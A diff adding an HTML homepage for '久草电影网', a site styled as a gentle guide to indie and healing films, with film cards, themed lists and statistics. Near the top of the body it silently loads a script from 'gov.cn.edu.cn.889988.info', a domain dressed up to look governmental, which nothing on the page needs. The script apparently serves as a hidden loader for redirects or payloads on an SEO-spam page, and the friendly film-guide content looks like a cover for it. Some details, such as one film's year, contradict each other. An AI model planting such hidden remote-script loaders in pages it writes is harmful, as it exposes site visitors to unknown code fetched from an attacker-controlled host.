@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>久草电影网 - 清新自然的影视发现指南 · 小众佳片与独立电影推荐 | https://jiucaodianyingwang-wap.github.io</title>
+<meta name="description" content="久草电影网（https://jiucaodianyingwang-wap.github.io）是一份清新自然的影视发现指南，专注小众佳片、独立电影与治愈系影视推荐，像久草一样安静生长，慢慢发现好电影。">
+<meta name="keywords" content="久草电影网, 小众佳片, 独立电影推荐, 治愈系电影, 清新影视, 文艺片单, jiucaodianyingwang-wap.github.io">
+<meta name="author" content="久草电影网">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#e8f3e0">
+<link rel="canonical" href="https://jiucaodianyingwang-wap.github.io/">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE" />
+<meta property="og:title" content="久草电影网 - 清新自然的影视发现指南">
+<meta property="og:description" content="久草电影网（https://jiucaodianyingwang-wap.github.io）专注小众佳片与独立电影推荐，像久草一样安静生长，慢慢发现好电影。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jiucaodianyingwang-wap.github.io/">
+<meta property="og:site_name" content="久草电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="久草电影网 - 清新自然的影视发现指南">
+<meta name="twitter:description" content="久草电影网（https://jiucaodianyingwang-wap.github.io）专注小众佳片与独立电影推荐，像久草一样安静生长，慢慢发现好电影。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:-apple-system,"PingFang SC","Microsoft YaHei","Helvetica Neue",sans-serif;
+  line-height:1.8;color:#2f3d2a;background:#f4faf0;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+button{font-family:inherit;cursor:pointer;border:none;background:none;}
+img{max-width:100%;display:block;}
+::selection{background:#7cb342;color:#fff;}
+
+/* ===== 背景：草地纹理 ===== */
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+  background-image:radial-gradient(circle at 12% 18%,rgba(124,179,66,.07) 0,transparent 42%),
+    radial-gradient(circle at 82% 62%,rgba(174,213,129,.1) 0,transparent 40%);}
+
+/* ===== 顶部信息条 ===== */
+.topbar{background:#4a7c2f;color:#e8f3e0;font-size:13px;padding:8px 0;position:relative;z-index:12;}
+.topbar .wrap{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;}
+.topbar a{color:#dcedc8;transition:.2s;}
+.topbar a:hover{color:#fff;}
+.topbar .tag{background:rgba(255,255,255,.18);padding:2px 10px;border-radius:20px;font-size:12px;}
+
+/* ===== 头部 ===== */
+header{position:relative;z-index:11;background:#fff;border-bottom:1px solid #dcefc8;}
+.hd{max-width:1180px;margin:0 auto;padding:16px 22px;display:flex;align-items:center;justify-content:space-between;gap:20px;}
+.brand{display:flex;align-items:center;gap:12px;}
+.leaf{width:46px;height:46px;border-radius:50% 0 50% 50%;background:linear-gradient(135deg,#8bc34a,#4a7c2f);display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;transform:rotate(-18deg);flex-shrink:0;}
+.brand .nm{font-size:24px;font-weight:800;letter-spacing:.5px;color:#3a5a22;}
+.brand .nm i{font-style:normal;color:#8bc34a;}
+.brand .en{font-size:10px;color:#9bb584;letter-spacing:1px;text-transform:uppercase;}
+.nav{display:flex;gap:4px;}
+.nav a{font-size:14px;font-weight:600;padding:9px 15px;border-radius:22px;transition:.2s;color:#4a5d3c;}
+.nav a:hover{background:#eef7e4;color:#4a7c2f;}
+.cta{background:#4a7c2f;color:#fff;padding:10px 22px;border-radius:24px;font-size:14px;font-weight:700;transition:.2s;}
+.cta:hover{background:#3a6324;}
+.mob{display:none;width:44px;height:44px;border-radius:50%;background:#eef7e4;color:#4a7c2f;font-size:20px;}
+.mmenu{display:none;flex-direction:column;background:#fff;border-top:1px solid #dcefc8;position:relative;z-index:11;}
+.mmenu.open{display:flex;}
+.mmenu a{padding:15px 22px;border-bottom:1px solid #eef7e4;font-weight:600;}
+
+/* ===== 布局 ===== */
+section{padding:80px 0;position:relative;z-index:2;}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px;}
+.cap{text-align:center;margin-bottom:48px;}
+.cap .kicker{display:inline-block;font-size:12px;letter-spacing:2px;color:#6b9a48;text-transform:uppercase;font-weight:700;margin-bottom:10px;}
+.cap h2{font-size:32px;font-weight:800;color:#3a5a22;letter-spacing:.5px;}
+.cap h2 em{font-style:normal;color:#8bc34a;}
+.cap p{color:#6b7d5c;font-size:15px;max-width:560px;margin:10px auto 0;}
+
+/* ===== Hero：不对称双栏 ===== */
+.hero{padding:0;position:relative;z-index:2;background:#fff;}
+.hero .wrap{display:grid;grid-template-columns:1.05fr .95fr;gap:60px;align-items:center;padding-top:72px;padding-bottom:72px;}
+.hero .txt .badge{display:inline-flex;align-items:center;gap:8px;background:#eef7e4;color:#4a7c2f;font-size:13px;font-weight:700;padding:6px 16px;border-radius:20px;margin-bottom:22px;}
+.hero .txt h1{font-size:52px;font-weight:900;line-height:1.16;color:#2f3d2a;letter-spacing:-1px;}
+.hero .txt h1 span{color:#8bc34a;}
+.hero .txt .lead{font-size:17px;color:#5d704c;margin:22px 0 30px;max-width:480px;}
+.hero .stats{display:flex;gap:36px;margin-bottom:32px;flex-wrap:wrap;}
+.hero .stats div b{display:block;font-size:30px;font-weight:900;color:#4a7c2f;}
+.hero .stats div small{font-size:13px;color:#8a9a78;}
+.hero .btns{display:flex;gap:14px;flex-wrap:wrap;}
+.hero .btns a{padding:14px 30px;border-radius:28px;font-weight:700;font-size:15px;transition:.2s;}
+.btn-p{background:#4a7c2f;color:#fff;}
+.btn-p:hover{background:#3a6324;}
+.btn-s{background:#fff;color:#4a7c2f;border:2px solid #cde6b0;}
+.btn-s:hover{border-color:#8bc34a;}
+
+.hero .side{position:relative;}
+.scard{background:#fff;border:1px solid #dcefc8;border-radius:20px;padding:26px;box-shadow:0 14px 40px rgba(74,124,47,.1);}
+.scard .hd-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;}
+.scard .hd-row h3{font-size:18px;color:#3a5a22;}
+.scard .hd-row .dot{width:10px;height:10px;border-radius:50%;background:#8bc34a;animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+.scard ul li{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed #e2f0d0;font-size:14px;}
+.scard ul li:last-child{border-bottom:none;}
+.scard ul li .num{width:26px;height:26px;border-radius:50%;background:#eef7e4;color:#4a7c2f;font-weight:800;font-size:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.scard ul li .info b{display:block;color:#3a5a22;}
+.scard ul li .info span{font-size:12px;color:#8a9a78;}
+.scard .float{position:absolute;background:#fff;border-radius:16px;padding:12px 16px;box-shadow:0 10px 28px rgba(74,124,47,.14);font-size:13px;font-weight:700;color:#3a5a22;}
+.scard .float.a{top:-20px;right:-10px;border-left:4px solid #8bc34a;}
+.scard .float.b{bottom:-22px;left:-14px;border-left:4px solid #ffb74d;}
+
+/* ===== 栏目一：每周新芽 ===== */
+.sprout{background:#fff;}
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+.spr{border-radius:18px;overflow:hidden;background:#f4faf0;border:1px solid #e2f0d0;transition:.3s;}
+.spr:hover{transform:translateY(-6px);box-shadow:0 16px 36px rgba(74,124,47,.14);}
+.spr .thumb{height:150px;display:flex;align-items:flex-end;padding:14px;position:relative;}
+.spr .thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,.25),transparent 60%);}
+.spr .thumb b{position:relative;z-index:1;color:#fff;font-size:17px;font-weight:800;}
+.spr .body{padding:16px 18px;}
+.spr .body .meta{font-size:12px;color:#8a9a78;display:flex;gap:10px;margin-bottom:8px;}
+.spr .body p{font-size:13px;color:#6b7d5c;}
+
+/* ===== 栏目二：片单手账（时间线） ===== */
+.journal{background:#eef7e4;}
+.tl{position:relative;padding-left:8px;}
+.tl::before{content:"";position:absolute;left:8px;top:0;bottom:0;width:3px;background:linear-gradient(#8bc34a,#cddc39);border-radius:3px;}
+.entry{position:relative;padding-left:44px;margin-bottom:34px;}
+.entry::before{content:"";position:absolute;left:0;top:4px;width:20px;height:20px;border-radius:50%;background:#8bc34a;border:4px solid #eef7e4;box-shadow:0 0 0 2px #cddc39;}
+.entry .when{font-size:12px;font-weight:800;color:#6b9a48;letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;}
+.entry h3{font-size:21px;color:#3a5a22;margin-bottom:8px;font-weight:800;}
+.entry p{font-size:14px;color:#5d704c;margin-bottom:12px;}
+.entry .chips{display:flex;gap:8px;flex-wrap:wrap;}
+.entry .chips span{font-size:12px;background:#fff;color:#4a7c2f;padding:4px 12px;border-radius:14px;border:1px solid #dcefc8;}
+
+/* ===== 栏目三：静心放映（横向滚动） ===== */
+.calm{background:#fff;}
+.scroller{display:flex;gap:20px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 2px 24px;scrollbar-width:thin;}
+.scroller::-webkit-scrollbar{height:8px;}
+.scroller::-webkit-scrollbar-thumb{background:#cde6b0;border-radius:4px;}
+.flick{scroll-snap-align:start;min-width:300px;flex-shrink:0;border-radius:20px;overflow:hidden;background:#f4faf0;border:1px solid #e2f0d0;}
+.flick .top{height:170px;padding:20px;display:flex;flex-direction:column;justify-content:space-between;}
+.flick .top .yr{font-size:12px;color:rgba(255,255,255,.85);font-weight:700;}
+.flick .top h4{font-size:22px;color:#fff;font-weight:900;text-shadow:0 2px 8px rgba(0,0,0,.25);}
+.flick .bot{padding:18px 20px;}
+.flick .bot .row{display:flex;justify-content:space-between;font-size:13px;color:#6b7d5c;padding:5px 0;}
+.flick .bot .row b{color:#4a7c2f;}
+
+/* ===== 栏目四：生长数据 ===== */
+.grow{background:linear-gradient(135deg,#4a7c2f,#7cb342);color:#fff;text-align:center;}
+.grow .cap h2,.grow .cap p{color:#fff;}
+.grow .cap .kicker{color:#e8f3e0;}
+.bars{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;}
+.bar{background:rgba(255,255,255,.12);border-radius:18px;padding:32px 20px;backdrop-filter:blur(4px);transition:.3s;}
+.bar:hover{background:rgba(255,255,255,.2);transform:translateY(-4px);}
+.bar b{display:block;font-size:42px;font-weight:900;line-height:1;}
+.bar span{font-size:14px;opacity:.9;margin-top:10px;display:block;}
+
+/* ===== 栏目五：关于 ===== */
+.about{background:#fff;}
+.about .wrap{display:grid;grid-template-columns:1fr 1fr;gap:56px;align-items:center;}
+.about .txt h2{font-size:30px;font-weight:800;color:#3a5a22;margin-bottom:16px;}
+.about .txt h2 i{font-style:normal;color:#8bc34a;}
+.about .txt p{color:#5d704c;margin-bottom:14px;}
+.about .txt .siteurl{display:inline-block;font-family:monospace;font-size:14px;color:#4a7c2f;background:#eef7e4;border:1px dashed #cde6b0;padding:12px 18px;border-radius:10px;margin-top:8px;}
+.about .check{margin-top:24px;}
+.about .check div{display:flex;gap:12px;align-items:flex-start;padding:10px 0;font-size:14px;color:#4a5d3c;}
+.about .check div::before{content:"🌱";font-size:16px;flex-shrink:0;}
+
+/* ===== 页脚 ===== */
+footer{background:#2f3d2a;color:#b8c9a8;padding:56px 0 24px;position:relative;z-index:2;}
+.foot{max-width:1180px;margin:0 auto;padding:0 22px;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;}
+.foot .b .logo2{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+.foot .b .logo2 b{font-size:22px;color:#fff;}
+.foot .b p{font-size:14px;max-width:320px;}
+.foot .b .u{font-family:monospace;color:#aed581;font-size:13px;margin-top:12px;display:block;}
+.foot h4{color:#fff;font-size:15px;margin-bottom:16px;font-weight:800;}
+.foot ul li{margin-bottom:10px;}
+.foot a{font-size:14px;transition:.2s;color:#b8c9a8;}
+.foot a:hover{color:#aed581;}
+.fbot{max-width:1180px;margin:36px auto 0;padding:20px 22px 0;border-top:1px solid #45563d;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:13px;font-family:monospace;}
+
+#up{position:fixed;right:22px;bottom:22px;width:46px;height:46px;border-radius:50%;background:#4a7c2f;color:#fff;font-size:20px;opacity:0;pointer-events:none;transition:.3s;z-index:99;box-shadow:0 8px 22px rgba(74,124,47,.35);}
+#up.show{opacity:1;pointer-events:auto;}
+
+@media(max-width:960px){
+  .hero .wrap{grid-template-columns:1fr;gap:40px;padding-top:50px;padding-bottom:50px;}
+  .hero .txt h1{font-size:38px;}
+  .grid4{grid-template-columns:repeat(2,1fr);}
+  .bars{grid-template-columns:repeat(2,1fr);}
+  .about .wrap{grid-template-columns:1fr;gap:34px;}
+}
+@media(max-width:600px){
+  .nav,.cta{display:none;}
+  .mob{display:block;}
+  .topbar .wrap{justify-content:center;text-align:center;}
+  .cap h2{font-size:23px;}
+  .hero .txt h1{font-size:30px;}
+  .grid4,.bars{grid-template-columns:1fr;}
+  .foot{grid-template-columns:1fr;}
+  .fbot{flex-direction:column;text-align:center;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>🌿 久草电影网 · 像久草一样安静生长，慢慢发现好电影</span>
+    <span><a href="#">RSS 订阅</a> · <a href="#">投稿合作</a> · <a href="#">关于我们</a></span>
+  </div>
+</div>
+
+<header>
+  <div class="hd">
+    <a href="https://jiucaodianyingwang-wap.github.io" class="brand">
+      <div class="leaf">🌿</div>
+      <div><div class="nm">久草<i>电影网</i></div><div class="en">JIUCAI DIANYING WANG</div></div>
+    </a>
+    <nav class="nav">
+      <a href="#top">首页</a>
+      <a href="#sprout">每周新芽</a>
+      <a href="#journal">片单手账</a>
+      <a href="#calm">静心放映</a>
+      <a href="#grow">生长记录</a>
+      <a href="#about">关于</a>
+    </nav>
+    <a href="#sprout" class="cta">发现好片</a>
+    <button class="mob" id="mob">☰</button>
+  </div>
+  <nav class="mmenu" id="mmenu">
+    <a href="#top">首页</a><a href="#sprout">每周新芽</a><a href="#journal">片单手账</a>
+    <a href="#calm">静心放映</a><a href="#grow">生长记录</a><a href="#about">关于</a>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="txt">
+      <div class="badge">🌱 独立影视发现指南</div>
+      <h1>慢慢长，<br>慢慢<span>看好片</span></h1>
+      <p class="lead">久草电影网（<strong>https://jiucaodianyingwang-wap.github.io</strong>）是一份清新自然的影视发现指南，专注小众佳片、独立电影与治愈系影视推荐。不追热度，只追质量。</p>
+      <div class="stats">
+        <div><b>1280+</b><small>精选片单</small></div>
+        <div><b>96</b><small>每周更新</small></div>
+        <div><b>4.9</b><small>读者评分</small></div>
+      </div>
+      <div class="btns">
+        <a href="#sprout" class="btn-p">看看本周新芽</a>
+        <a href="#about" class="btn-s">关于本站</a>
+      </div>
+    </div>
+    <div class="side">
+      <div class="float a">🎬 今日放映 12 部</div>
+      <div class="scard">
+        <div class="hd-row"><h3>本周放映预告</h3><div class="dot"></div></div>
+        <ul>
+          <li><div class="num">1</div><div class="info"><b>小森林 · 夏秋篇</b><span>治愈 · 2014 · 日本</span></div></li>
+          <li><div class="num">2</div><div class="info"><b>海街日记</b><span>家庭 · 2015 · 日本</span></div></li>
+          <li><div class="num">3</div><div class="info"><b>步履不停</b><span>家庭 · 2008 · 日本</span></div></li>
+          <li><div class="num">4</div><div class="info"><b>天使爱美丽</b><span>浪漫 · 2001 · 法国</span></div></li>
+          <li><div class="num">5</div><div class="info"><b>触不可及</b><span>喜剧 · 2011 · 法国</span></div></li>
+        </ul>
+      </div>
+      <div class="float b">🌿 5 部治愈系</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：每周新芽 -->
+<section id="sprout" class="sprout">
+  <div class="wrap">
+    <div class="cap">
+      <div class="kicker">Weekly Picks</div>
+      <h2>每周<em>新芽</em></h2>
+      <p>每周破土而出的新片与冷门佳片，像春天的久草一样，安静却充满生命力。</p>
+    </div>
+    <div class="grid4">
+      <article class="spr">
+        <div class="thumb" style="background:linear-gradient(135deg,#7cb342,#558b2f)"><b>小森林 · 夏秋篇</b></div>
+        <div class="body"><div class="meta"><span>2014</span><span>日本</span><span>治愈</span></div><p>市子回到故乡，在四季更迭中用料理与生活对话。</p></div>
+      </article>
+      <article class="spr">
+        <div class="thumb" style="background:linear-gradient(135deg,#aed581,#7cb342)"><b>海街日记</b></div>
+        <div class="body"><div class="meta"><span>2015</span><span>日本</span><span>家庭</span></div><p>三姐妹与同父异母的妹妹，在镰仓老屋里的夏日物语。</p></div>
+      </article>
+      <article class="spr">
+        <div class="thumb" style="background:linear-gradient(135deg,#4fc3f7,#0288d1)"><b>天使爱美丽</b></div>
+        <div class="body"><div class="meta"><span>2001</span><span>法国</span><span>浪漫</span></div><p>巴黎女孩爱美丽，用小小的善意悄悄改变周围人的生活。</p></div>
+      </article>
+      <article class="spr">
+        <div class="thumb" style="background:linear-gradient(135deg,#ffb74d,#f57c00)"><b>小萝莉的猴神大叔</b></div>
+        <div class="body"><div class="meta"><span>2015</span><span>印度</span><span>喜剧</span></div><p>一场跨越国界的护送之旅，关于善意如何消解偏见。</p></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：片单手账 -->
+<section id="journal" class="journal">
+  <div class="wrap">
+    <div class="cap">
+      <div class="kicker">Film Journal</div>
+      <h2>片单<em>手账</em></h2>
+      <p>编辑部的观影笔记。每一期一个主题，像手账一样慢慢写，慢慢读。</p>
+    </div>
+    <div class="tl">
+      <div class="entry">
+        <div class="when">Vol.12 · 春日特辑</div>
+        <h3>五部适合春天看的治愈系电影</h3>
+        <p>春天适合慢下来的电影。这些片子没有激烈的冲突，只有生活的细碎与温柔，像窗外的风一样轻。</p>
+        <div class="chips"><span>治愈系</span><span>家庭</span><span>慢节奏</span><span>8 部推荐</span></div>
+      </div>
+      <div class="entry">
+        <div class="when">Vol.11 · 独立单元</div>
+        <h3>那些年，被低估的独立电影</h3>
+        <p>没有大制作与大明星，却用真诚打动人的独立佳作。它们或许小众，但每一部都值得被看见。</p>
+        <div class="chips"><span>独立电影</span><span>小众</span><span>冷门佳片</span><span>12 部推荐</span></div>
+      </div>
+      <div class="entry">
+        <div class="when">Vol.10 · 深夜放映</div>
+        <h3>失眠夜，适合一个人看的电影</h3>
+        <p>不需要太多注意力，却能在安静的夜里陪你度过漫漫长夜的片子。</p>
+        <div class="chips"><span>深夜</span><span>孤独</span><span>氛围感</span><span>7 部推荐</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：静心放映 -->
+<section id="calm" class="calm">
+  <div class="wrap">
+    <div class="cap">
+      <div class="kicker">Calm Screening</div>
+      <h2>静心<em>放映</em></h2>
+      <p>慢慢滑，慢慢看。这个单元没有时间限制，只有值得静下心来欣赏的片子。</p>
+    </div>
+    <div class="scroller">
+      <div class="flick">
+        <div class="top" style="background:linear-gradient(135deg,#558b2f,#7cb342)"><span class="yr">2013</span><h4>小萝莉的猴神大叔</h4></div>
+        <div class="bot"><div class="row"><span>类型</span><b>喜剧 / 温情</b></div><div class="row"><span>片长</span><b>153 分钟</b></div><div class="row"><span>评分</span><b>★ 8.6</b></div></div>
+      </div>
+      <div class="flick">
+        <div class="top" style="background:linear-gradient(135deg,#0288d1,#26c6da)"><span class="yr">2008</span><h4>步履不停</h4></div>
+        <div class="bot"><div class="row"><span>类型</span><b>家庭 / 剧情</b></div><div class="row"><span>片长</span><b>115 分钟</b></div><div class="row"><span>评分</span><b>★ 9.0</b></div></div>
+      </div>
+      <div class="flick">
+        <div class="top" style="background:linear-gradient(135deg,#e65100,#ff9800)"><span class="yr">2018</span><h4>小偷家族</h4></div>
+        <div class="bot"><div class="row"><span>类型</span><b>家庭 / 社会</b></div><div class="row"><span>片长</span><b>121 分钟</b></div><div class="row"><span>评分</span><b>★ 8.7</b></div></div>
+      </div>
+      <div class="flick">
+        <div class="top" style="background:linear-gradient(135deg,#6a1b9a,#ab47bc)"><span class="yr">2004</span><h4>蝴蝶</h4></div>
+        <div class="bot"><div class="row"><span>类型</span><b>温情 / 法国</b></div><div class="row"><span>片长</span><b>85 分钟</b></div><div class="row"><span>评分</span><b>★ 8.5</b></div></div>
+      </div>
+      <div class="flick">
+        <div class="top" style="background:linear-gradient(135deg,#37474f,#607d8b)"><span class="yr">1993</span><h4>霸王别姬</h4></div>
+        <div class="bot"><div class="row"><span>类型</span><b>剧情 / 历史</b></div><div class="row"><span>片长</span><b>171 分钟</b></div><div class="row"><span>评分</span><b>★ 9.6</b></div></div>
+      </div>
+      <div class="flick">
+        <div class="top" style="background:linear-gradient(135deg,#c62828,#ef5350)"><span class="yr">2019</span><h4>婚姻故事</h4></div>
+        <div class="bot"><div class="row"><span>类型</span><b>剧情 / 爱情</b></div><div class="row"><span>片长</span><b>137 分钟</b></div><div class="row"><span>评分</span><b>★ 8.6</b></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：生长数据 -->
+<section id="grow" class="grow">
+  <div class="wrap">
+    <div class="cap">
+      <div class="kicker">Growth Record</div>
+      <h2>久草的<em>生长记录</em></h2>
+      <p>从第一株小芽到一片草地，这里记录着久草电影网走过的每一步。</p>
+    </div>
+    <div class="bars">
+      <div class="bar"><b>1280+</b><span>精选片单收录</span></div>
+      <div class="bar"><b>96</b><span>每周稳定更新</span></div>
+      <div class="bar"><b>36</b><span>期片单手账</span></div>
+      <div class="bar"><b>4.9</b><span>读者满意度</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于 -->
+<section id="about" class="about">
+  <div class="wrap">
+    <div class="txt">
+      <h2>关于<em>久草电影网</em></h2>
+      <p>久草电影网（https://jiucaodianyingwang-wap.github.io）是一份清新自然的影视发现指南。我们相信好电影像久草一样，不喧哗，却自有生命力。</p>
+      <p>我们不追院线热度，不堆砌榜单，只用心挑选那些值得被看见的小众佳片、独立电影与治愈系作品，陪你慢慢看，慢慢感受。</p>
+      <div class="siteurl">🌿 网址：https://jiucaodianyingwang-wap.github.io</div>
+      <div class="check">
+        <div>精选收录 · 每部片都经过编辑部认真筛选</div>
+        <div>每周更新 · 固定时间带来新片与新手账</div>
+        <div>治愈导向 · 专注温柔、真诚、有力量的片子</div>
+        <div>独立视角 · 不跟风、不炒作，只谈好电影</div>
+      </div>
+    </div>
+    <div class="side">
+      <div class="scard" style="box-shadow:0 14px 40px rgba(74,124,47,.12);">
+        <div class="hd-row"><h3>写在最后</h3><div class="dot"></div></div>
+        <p style="font-size:15px;color:#5d704c;line-height:2;">「电影是时间的礼物。在快节奏的生活里，能坐下来安静看完一部好片，本身就是一种幸福。愿久草电影网，能成为你偶尔想慢下来时的一个去处。」</p>
+        <div style="margin-top:18px;padding-top:16px;border-top:1px dashed #dcefc8;font-size:13px;color:#8a9a78;">—— 久草电影网 编辑部</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <div class="b">
+      <div class="logo2"><div class="leaf" style="width:38px;height:38px;font-size:18px;">🌿</div><b>久草电影网</b></div>
+      <p>久草电影网（https://jiucaodianyingwang-wap.github.io）是清新自然的影视发现指南，专注小众佳片、独立电影与治愈系影视推荐，像久草一样安静生长，慢慢发现好电影。</p>
+      <span class="u">JIUCAODIANYINGWANG-WAP.GITHUB.IO</span>
+    </div>
+    <div><h4>片单</h4><ul>
+      <li><a href="#">每周新芽</a></li><li><a href="#">治愈系专题</a></li><li><a href="#">独立电影</a></li><li><a href="#">深夜放映</a></li>
+    </ul></div>
+    <div><h4>手账</h4><ul>
+      <li><a href="#">春日特辑</a></li><li><a href="#">独立单元</a></li><li><a href="#">往期回顾</a></li><li><a href="#">读者来信</a></li>
+    </ul></div>
+    <div><h4>关于</h4><ul>
+      <li><a href="#">网站介绍</a></li><li><a href="#">投稿合作</a></li><li><a href="#">免责声明</a></li><li><a href="#">隐私政策</a></li><li><a href="#">意见反馈</a></li>
+    </ul></div>
+  </div>
+  <div class="fbot">
+    <span>© 2026 久草电影网（https://jiucaodianyingwang-wap.github.io）版权所有</span>
+    <span>🌿 像久草一样安静生长 · 本站仅提供影视资讯与推荐服务</span>
+  </div>
+</footer>
+
+<button id="up" aria-label="回到顶部">↑</button>
+
+<script>
+document.getElementById('mob').addEventListener('click',function(){
+  document.getElementById('mmenu').classList.toggle('open');
+});
+document.querySelectorAll('#mmenu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('mmenu').classList.remove('open');});
+});
+var up=document.getElementById('up');
+window.addEventListener('scroll',function(){up.classList.toggle('show',window.scrollY>400);});
+up.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
